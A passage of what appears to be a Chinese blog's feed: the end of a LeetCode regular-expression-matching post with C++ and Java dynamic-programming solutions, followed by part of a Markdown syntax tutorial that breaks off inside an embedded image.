class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 分别是字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 的长度。由于大部分语言中，字符串的字符下标是从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 开始的，因此在实现上面的状态转移方程时，需要注意状态中每一维下标与实际字符下标的对应关系。</p><p>在上面的状态转移方程中，如果字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 中包含一个「字符 + 星号」的组合（例如 a*），那么在进行状态转移时，会先将 a 进行匹配（当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">p[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span> 为 a 时），再将 a* 作为整体进行匹配（当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">p[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span> 为 * 时）。然而，在题目描述中，我们必须将 a* 看成一个整体，因此将 a 进行匹配是不符合题目要求的。看来我们进行了额外的状态转移，这样会对最终的答案产生影响吗？这个问题留给读者进行思考。</p><p>作者：LeetCode-Solution</p></blockquote><p>用 c++ 实现了以下官方解法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isMatch</span><span class="params">(string s, string p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = s.<span class="built_in">size</span>(), n = p.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> fn = [&amp;](<span class="keyword">int</span> i, <span class="keyword">int</span> j) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(p[j - <span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> s[i - <span class="number">1</span>] == p[j - <span class="number">1</span>];</span><br><span class="line">        &#125;;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">a</span>(m + <span class="number">1</span>, vector&lt;<span class="keyword">int</span>&gt;(n + <span class="number">1</span>));</span><br><span class="line">        a[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(p[j - <span class="number">1</span>] == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    a[i][j] = a[i][j - <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">fn</span>(i, j - <span class="number">1</span>)) &#123;</span><br><span class="line">                        a[i][j] |= a[i - <span class="number">1</span>][j];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">fn</span>(i, j)) &#123;</span><br><span class="line">                        a[i][j] = a[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>4 ms</strong></p></li><li><p>内存消耗: <strong>7 MB</strong></p></li></ul><p>这里需要特别注意：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">fn</span>(i, j - <span class="number">1</span>)) &#123;</span><br><span class="line">a[i][j] |= a[i - <span class="number">1</span>][j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此之前已经执行过 <code>a[i][j] = a[i][j - 2];</code> ，所以 <code>a[i][j]</code> 的取值将与 <code>a[i][j - 2]</code> 有关，因此这里使用位运算进行赋值：<code>a[i][j] |= a[i - 1][j];</code> 。</p><p>此外，在题干中有如下提示：</p><blockquote><p><strong>提示：</strong></p><ul><li><code>1 &lt;= s.length &lt;= 20</code></li><li><code>1 &lt;= p.length &lt;= 30</code></li><li><code>s</code> 可能为空，且只包含从 <code>a-z</code> 的小写字母。</li><li><code>p</code> 可能为空，且只包含从 <code>a-z</code> 的小写字母，以及字符 <code>.</code> 和 <code>*</code>。</li><li>保证每次出现字符 <code>*</code> 时，前面都匹配到有效的字符</li></ul></blockquote><p>貌似相互矛盾了，实测 <code>s</code> 和 <code>p</code> 确实不能为空，但是，我自己的代码考虑了，也就是说，力扣对我的代码测试也许并不全面，我的代码也许存在 bug ~ 先放着吧，问题不大。</p><p>继续练习以下用 Java 来实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isMatch</span><span class="params">(String s, String p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = s.length(), n = p.length();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span>[][] a = <span class="keyword">new</span> <span class="keyword">boolean</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        a[<span class="number">0</span>][<span class="number">0</span>] = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(p.charAt(j - <span class="number">1</span>) == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    a[i][j] = a[i][j - <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">if</span>(fn(s, p, i, j - <span class="number">1</span>)) &#123;</span><br><span class="line">                        a[i][j] |= a[i - <span class="number">1</span>][j];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(fn(s, p, i, j)) &#123;</span><br><span class="line">                        a[i][j] = a[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">fn</span><span class="params">(String s, String p, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p.charAt(j - <span class="number">1</span>) == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.charAt(i - <span class="number">1</span>) == p.charAt(j - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>1 ms</strong></p></li><li><p>内存消耗: <strong>37 MB</strong></p></li></ul><blockquote><p><strong>总结</strong></p><p>第十题可有点太复杂了~</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> 刷题 </tag>
            
            <tag> 算法 </tag>
            
            <tag> Java </tag>
            
            <tag> C++ </tag>
            
            <tag> 动态规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown 语法笔记</title>
      <link href="/posts/93ad49f7/"/>
      <url>/posts/93ad49f7/</url>
      
        <content type="html"><![CDATA[<h1>Markdown</h1><p>Markdown 是一种轻量级的标记语言，可用于在纯文本文档中添加格式化元素。Markdown 由 John Gruber 于 2004 年创建。它使用易读易写的纯文本格式编写文档，可与HTML混编，可导出 HTML、PDF 以及本身的 .md 格式的文件。因简洁、高效、易读、易写，Markdown被大量使用。</p><ol><li>专注于文字内容；</li><li>纯文本，易读易写，可以方便地纳入版本控制；</li><li>语法简单，没有什么学习成本，能轻松在码字的同时做出美观大方的排版。</li></ol><p>本文仅为便于博主平时查看，全文移植于 <a href="https://markdown.com.cn/">Markdown 官网</a>，部分无法正常显示的列表均以图片替代，尽量保持与原教程一致，在此特别感谢 Markdown 提供的非常详细的教程。</p><h2 id="标题">标题</h2><h3 id="标题语法">标题语法</h3><p>要创建标题，请在单词或短语前面添加井号 (<code>#</code>) 。<code>#</code> 的数量代表了标题的级别。例如，添加三个 <code>#</code> 表示创建一个三级标题 (<code>&lt;h3&gt;</code>) (例如：<code>### My Header</code>)。</p><p><img src="%E6%A0%87%E9%A2%98%E8%AF%AD%E6%B3%95.png" alt=""></p><h4 id="可选语法">可选语法</h4><p>还可以在文本下方添加任意数量的 == 号来标识一级标题，或者 – 号来标识二级标题。</p><p><img src="%E6%A0%87%E9%A2%98%E5%8F%AF%E9%80%89%E8%AF%AD%E6%B3%95.png" alt=""></p><h4 id="最佳实践">最佳实践</h4><p>不同的 Markdown 应用程序处理 <code>#</code> 和标题之间的空格方式并不一致。为了兼容考虑，请用一个空格在 <code>#</code> 和标题之间进行分隔。</p><table><thead><tr><th>✅ 这样做</th><th>❌ 不要这样做</th></tr></thead><tbody><tr><td><code># Here's a Heading</code></td><td><code>#Here's a Heading</code></td></tr></tbody></table><h2 id="段落">段落</h2><h3 id="段落语法">段落语法</h3><p>要创建段落，请使用空白行将一行或多行文本进行分隔。</p><p><img src="%E6%AE%B5%E8%90%BD%E8%AF%AD%E6%B3%95.png" alt=""></p><h4 id="段落（Paragraph）用法的最佳实">段落（Paragraph）用法的最佳实</h4><p>不要用空格（spaces）或制表符（ tabs）缩进段落。</p><p><img src="%E6%AE%B5%E8%90%BD%E6%9C%80%E4%BD%B3%E7%94%A8%E6%B3%95.png" alt=""></p><h2 id="换行">换行</h2><h3 id="换行语法">换行语法</h3><p>在一行的末尾添加两个或多个空格，然后按回车键,即可创建一个换行(<code>&lt;br&gt;</code>)。</p><p><img src="%E6%8D%A2%E8%A1%8C%E8%AF%AD%E6%B3%95.png" alt=""></p><h4 id="换行（Line-Break）用法的最佳实践">换行（Line Break）用法的最佳实践</h4><p>几乎每个 Markdown 应用程序都支持两个或多个空格进行换行，称为 <code>结尾空格（trailing whitespace)</code> 的方式，但这是有争议的，因为很难在编辑器中直接看到空格，并且很多人在每个句子后面都会有意或无意地添加两个空格。由于这个原因，你可能要使用除结尾空格以外的其它方式来换行。幸运的是，几乎每个 Markdown 应用程序都支持另一种换行方式：HTML 的 <code>&lt;br&gt;</code> 标签。</p><p>为了兼容性，请在行尾添加“结尾空格”或 HTML 的 <code>&lt;br&gt;</code> 标签来实现换行。</p><p>还有两种其他方式我并不推荐使用。CommonMark 和其它几种轻量级标记语言支持在行尾添加反斜杠 (<code>\</code>) 的方式实现换行，但是并非所有 Markdown 应用程序都支持此种方式，因此从兼容性的角度来看，不推荐使用。并且至少有两种轻量级标记语言支持无须在行尾添加任何内容，只须键入回车键（<code>return</code>）即可实现换行。</p><p><img src="%E6%8D%A2%E8%A1%8C%E6%9C%80%E4%BD%B3%E7%94%A8%E6%B3%95.png" alt=""></p><h2 id="强调">强调</h2><p>通过将文本设置为粗体或斜体来强调其重要性。</p><h3 id="粗体（Bold）">粗体（Bold）</h3><p>要加粗文本，请在单词或短语的前后各添加两个星号（asterisks）或下划线（underscores）。如需加粗一个单词或短语的中间部分用以表示强调的话，请在要加粗部分的两侧各添加两个星号（asterisks）。</p><table><thead><tr><th>Markdown语法</th><th>HTML</th><th>预览效果</th></tr></thead><tbody><tr><td><code>I just love **bold text**.</code></td><td><code>I just love &lt;strong&gt;bold text&lt;/strong&gt;.</code></td><td>I just love <strong>bold text</strong>.</td></tr><tr><td><code>I just love __bold text__.</code></td><td><code>I just love &lt;strong&gt;bold text&lt;/strong&gt;.</code></td><td>I just love <strong>bold text</strong>.</td></tr><tr><td><code>Love**is**bold</code></td><td><code>Love&lt;strong&gt;is&lt;/strong&gt;bold</code></td><td>Love<strong>is</strong>bold</td></tr></tbody></table><h4 id="粗体（Bold）用法最佳实践">粗体（Bold）用法最佳实践</h4><p>Markdown 应用程序在如何处理单词或短语中间的下划线上并不一致。为兼容考虑，在单词或短语中间部分加粗的话，请使用星号（asterisks）。</p><table><thead><tr><th>✅ Do this</th><th>❌ Don’t do this</th></tr></thead><tbody><tr><td><code>Love**is**bold</code></td><td><code>Love__is__bold</code></td></tr></tbody></table><h3 id="斜体（Italic）">斜体（Italic）</h3><p>要用斜体显示文本，请在单词或短语前后添加一个星号（asterisk）或下划线（underscore）。要斜体突出单词的中间部分，请在字母前后各添加一个星号，中间不要带空格。</p><table><thead><tr><th>Markdown语法</th><th>HTML</th><th>预览效果</th></tr></thead><tbody><tr><td><code>Italicized text is the *cat's meow*.</code></td><td><code>Italicized text is the &lt;em&gt;cat's meow&lt;/em&gt;.</code></td><td>Italicized text is the <em>cat’s meow</em>.</td></tr><tr><td><code>Italicized text is the _cat's meow_.</code></td><td><code>Italicized text is the &lt;em&gt;cat's meow&lt;/em&gt;.</code></td><td>Italicized text is the <em>cat’s meow</em>.</td></tr><tr><td><code>A*cat*meow</code></td><td><code>A&lt;em&gt;cat&lt;/em&gt;meow</code></td><td>A<em>cat</em>meow</td></tr></tbody></table><h4 id="斜体（Italic）用法的最佳实践">斜体（Italic）用法的最佳实践</h4><p>要同时用粗体和斜体突出显示文本，请在单词或短语的前后各添加三个星号或下划线。要加粗并用斜体显示单词或短语的中间部分，请在要突出显示的部分前后各添加三个星号，中间不要带空格。</p><table><thead><tr><th>✅ Do this</th><th>❌ Don’t do this</th></tr></thead><tbody><tr><td><code>A*cat*meow</code></td><td><code>A_cat_meow</code></td></tr></tbody></table><h3 id="粗体（Bold）和斜体（Italic）">粗体（Bold）和斜体（Italic）</h3><p>要同时用粗体和斜体突出显示文本，请在单词或短语的前后各添加三个星号或下划线。要加粗并用斜体显示单词或短语的中间部分，请在要突出显示的部分前后各添加三个星号，中间不要带空格。</p><p><img src="%E7%B2%97%E4%BD%93%E5%92%8C%E6%96%9C%E4%BD%93.png" alt=""></p><h4 id="粗体（Bold）和斜体（Italic）用法的最佳实践">粗体（Bold）和斜体（Italic）用法的最佳实践</h4><p>Markdown 应用程序在处理单词或短语中间添加的下划线上并不一致。为了实现兼容性，请使用星号将单词或短语的中间部分加粗并以斜体显示，以示重要。</p><table><thead><tr><th>✅ Do this</th><th>❌ Don’t do this</th></tr></thead><tbody><tr><td><code>This is really***very***important text.</code></td><td><code>This is really___very___important text.</code></td></tr></tbody></table><h2 id="引用">引用</h2><h3 id="引用语法">引用语法</h3><p>要创建块引用，请在段落前添加一个 <code>&gt;</code> 符号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; Dorothy followed her through many of the beautiful rooms in her castle.</span><br></pre></td></tr></table></figure><p>渲染效果如下所示：</p><blockquote><p>Dorothy followed her through many of the beautiful rooms in her castle.</p></blockquote><h4 id="多个段落的块引用">多个段落的块引用</h4><p>块引用可以包含多个段落。为段落之间的空白行添加一个 <code>&gt;</code> 符号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; Dorothy followed her through many of the beautiful rooms in her castle.</span><br><span class="line">&gt;</span><br><span class="line">&gt; The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood.</span><br></pre></td></tr></table></figure><p>渲染效果如下：</p><blockquote><p>Dorothy followed her through many of the beautiful rooms in her castle.</p><p>The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood.</p></blockquote><h4 id="嵌套块引用">嵌套块引用</h4><p>块引用可以嵌套。在要嵌套的段落前添加一个 <code>&gt;&gt;</code> 符号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; Dorothy followed her through many of the beautiful rooms in her castle.</span><br><span class="line">&gt;</span><br><span class="line">&gt;&gt; The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood.</span><br></pre></td></tr></table></figure><p>渲染效果如下：</p><blockquote><p>Dorothy followed her through many of the beautiful rooms in her castle.</p><blockquote><p>The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood.</p></blockquote></blockquote><h4 id="带有其它元素的块引用">带有其它元素的块引用</h4><p>块引用可以包含其他 Markdown 格式的元素。并非所有元素都可以使用，你需要进行实验以查看哪些元素有效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; #### The quarterly results look great!</span><br><span class="line">&gt;</span><br><span class="line">&gt; - Revenue was off the chart.</span><br><span class="line">&gt; - Profits were higher than ever.</span><br><span class="line">&gt;</span><br><span class="line">&gt;  *Everything* is going according to **plan**.</span><br></pre></td></tr></table></figure><p>渲染效果如下：</p><blockquote><h4 id="The-quarterly-results-look-great">The quarterly results look great!</h4><ul><li>Revenue was off the chart.</li><li>Profits were higher than ever.</li></ul><p><em>Everything</em> is going according to <strong>plan</strong>.</p></blockquote><h2 id="列表">列表</h2><p>可以将多个条目组织成有序或无序列表。</p><h3 id="有序列表">有序列表</h3><p>要创建有序列表，请在每个列表项前添加数字并紧跟一个英文句点。数字不必按数学顺序排列，但是列表应当以数字 1 起始。</p><p><img src="%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8.png" alt=""></p><h4 id="有序列表最佳实践">有序列表最佳实践</h4><p>CommonMark and a few other lightweight markup languages let you use a parenthesis (<code>)</code>) as a delimiter (e.g., <code>1) First item</code>), but not all Markdown applications support this, so it isn’t a great option from a compatibility perspective. For compatibility, use periods only.</p><p><img src="%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8%E6%9C%80%E4%BD%B3%E7%94%A8%E6%B3%95.png" alt="有序列表最佳用法"></p><h3 id="无序列表">无序列表</h3><p>要创建无序列表，请在每个列表项前面添加破折号 (-)、星号 (*) 或加号 (+) 。缩进一个或多个列表项可创建嵌套列表。</p><p><img src="%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8.png" alt=""></p><h4 id="以数字开头的无序列表项">以数字开头的无序列表项</h4><p>如果你需要以数字开头并且紧跟一个英文句号（也就是 <code>.</code>）的无序列表项，则可以使使用反斜线（<code>\</code>）来转义这个英文句号。</p><p><img src="%E6%95%B0%E5%AD%97%E5%BC%80%E5%A4%B4%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8.png" alt=""></p><h4 id="无序列表最佳实践">无序列表最佳实践</h4><p>Markdown 应用程序在如何处理同一列表中混用不同分隔符上并不一致。为了兼容起见，请不要在同一个列表中混用不同的分隔符，最好选定一种分隔符并一直用下去。</p><p><img src="%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%E6%9C%80%E4%BD%B3%E7%94%A8%E6%B3%95.png" alt=""></p><h3 id="在列表中嵌套其他元素">在列表中嵌套其他元素</h3><p>要在保留列表连续性的同时在列表中添加另一种元素，请将该元素缩进四个空格或一个制表符，如下例所示：</p><h4 id="段落-2">段落</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*   This is the first list item.</span><br><span class="line">*   Here&#x27;s the second list item.</span><br><span class="line"></span><br><span class="line">    I need to add another paragraph below the second list item.</span><br><span class="line"></span><br><span class="line">*   And here&#x27;s the third list item.</span><br></pre></td></tr></table></figure><p>渲染效果如下：</p><ul><li><p>This is the first list item.</p></li><li><p>Here’s the second list item.</p><p>I need to add another paragraph below the second list item.</p></li><li><p>And here’s the third list item.</p></li></ul><h4 id="引用块">引用块</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*   This is the first list item.</span><br><span class="line">*   Here&#x27;s the second list item.</span><br><span class="line"></span><br><span class="line">    &gt; A blockquote would look great below the second list item.</span><br><span class="line"></span><br><span class="line">*   And here&#x27;s the third list item.</span><br></pre></td></tr></table></figure><p>渲染效果如下：</p><ul><li><p>This is the first list item.</p></li><li><p>Here’s the second list item.</p><blockquote><p>A blockquote would look great below the second list item.</p></blockquote></li><li><p>And here’s the third list item.</p></li></ul><h4 id="代码块">代码块</h4><p>代码块通常采用四个空格或一个制表符缩进。当它们被放在列表中时，请将它们缩进八个空格或两个制表符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.  Open the file.</span><br><span class="line">2.  Find the following code block on line 21:</span><br><span class="line"></span><br><span class="line">        &lt;html&gt;</span><br><span class="line">          &lt;head&gt;</span><br><span class="line">            &lt;title&gt;Test&lt;/title&gt;</span><br><span class="line">          &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">3.  Update the title to match the name of your website.</span><br></pre></td></tr></table></figure><p>渲染效果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. Open the file.</span><br><span class="line"></span><br><span class="line">2. Find the following code block on line 21:</span><br><span class="line"></span><br><span class="line">   &lt;html&gt;</span><br><span class="line"></span><br><span class="line">     &lt;head&gt;</span><br><span class="line">       &lt;title&gt;Test&lt;/title&gt;</span><br><span class="line">     &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">3. Update the title to match the name of your website.</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="图片">图片</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.  Open the file containing the Linux mascot.</span><br><span class="line">2.  Marvel at its beauty.</span><br><span class="line"></span><br><span class="line">    ![Tux, the Linux mascot](/assets/images/tux.png)</span><br><span class="line"></span><br><span class="line">3.  Close the file.</span><br></pre></td></tr></table></figure><p>渲染效果如下：</p><ol><li><p>Open the file containing the Linux mascot.</p></li><li><p>Marvel at its beauty.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAB5CAMAAAD4dHQjAAAArlBMVEX////Hx8ePj49XV1c7OzsfHx9JSUlzc3Orq6vx8fHj4+MtLS2BgYG5ubnV1dVlZWWdnZ3///9xXymZeBfClhWnghZwWxpzb2RVRxzdqhP4vhE6Mx2Mbxi0jBUtKR7qtBJxYzhXU0hJRTpIPRzPoBRjURt+ZRl+aShya1WBfXJyZ0b8/Pz5+fn9/f329vbu7u7p6enm5ubv7+/6+vro6Oj39/fz8/Ps7Oz09PTr6+uCz11jAAAAAXRSTlMAQObYZgAABuxJREFUeAG1mgd/ozwShy3gD4g+a/DZgsDeubwlcXq2fP8vdvEAgRCDUthne8EPoxkNI35ZfAhhmBZqbMeVi/nxHB+vcbyZFdLBGYJZHaGPs9gzrpmLIfNbQoxjz5VyH0Pmz4uJSaI5HALTmHNIYmiYYbtI6AhmKV8N1kyr9adTb0FL8mUJ9MSzFLA+KfNLbCcw0eerkqT+WNNHiy/oGc9Gh/iixGg+VjqtIyJG2vNKBJ2IwYTUIP2ZyoslZv9DbXrBQIvxdYlLNQ7Q/MFNOC1zSjyiMJFEIe/u2ubQM9aMEl4pp7lzIopamTmXJAGIXACSqJFwLoy+xPz6Zqw/VrxI4j8hEZyN0Pi2TNNs9R83aCXWjJKAq3e9UTVZ3uTEw1ySCLBOSSnUxbpQqlhfKFWUSDg3s7VhXpokU2pZVEpVxVIpVWXfDa83KRkzSPDfVA3ZFP/DrJJ1pc5QbWeTSGClzrDbqaqcKycCpcqqt47yQqn1fCW8Vau9GpCVmepJ/K/3rk213b+Kpdrn6emX2YZIB9irarXddYqiPLDzmz3XU8sCZ35ZFlVTuuVqw66/omSmU4rHef2+UZtVuS6KwzY/sEJlf3vkzTRE8s0aMjjlOc2Ki10dzuFv8eqpBecrEruZHdy/VEfxj0dMMMvAEgHNtBJ9awss/VdQQzTLUcjBCTrh/VOklUqX313qsGaYuj30pyAvMYwkopbBevnRl46kAY0Sff1IH4IJaRwb+FqFtXMoTZCgh/v5g1xME8gvnuvapLo0hYMevvzkqdeXNIX4yvucyEeNQ9NYwGeT3x1xBE2TfP4k7KDBIg3SxyeTH6IlIQ2c+sD9eFo8H13adXjcUzpL8JF2Yvj6tDMOW4IPdn3OpcV9ySM9og45RoMl391OhIP6TKqHAze7CjDe205iT1u/